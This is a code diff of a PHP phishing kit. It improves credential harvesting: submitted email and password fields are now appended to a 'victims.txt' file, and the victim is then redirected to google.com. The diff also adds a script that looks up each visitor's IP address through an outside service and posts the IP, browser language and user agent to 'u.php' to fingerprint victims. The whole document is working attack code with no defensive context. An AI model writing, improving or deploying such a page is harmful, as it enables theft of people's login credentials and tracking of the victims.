@@ -2,8 +2,8 @@
 $u = $_POST['eml'];
 $p = $_POST['pwd'];
 if ($u && $p){
-    $f = fopen('victims.txt','w+');
-    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
+    $f = fopen('victims.txt','a+');
+    fwrite($f,$u.'<!:!>'.$p."\n");
     fclose($f);
     echo "<script>window.location = 'https://google.com'</script>";
 }
@@ -206,6 +206,30 @@ if ($u && $p){
     }
   }
   </script>
+  <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script>    
+
 
       </div>
     </div>
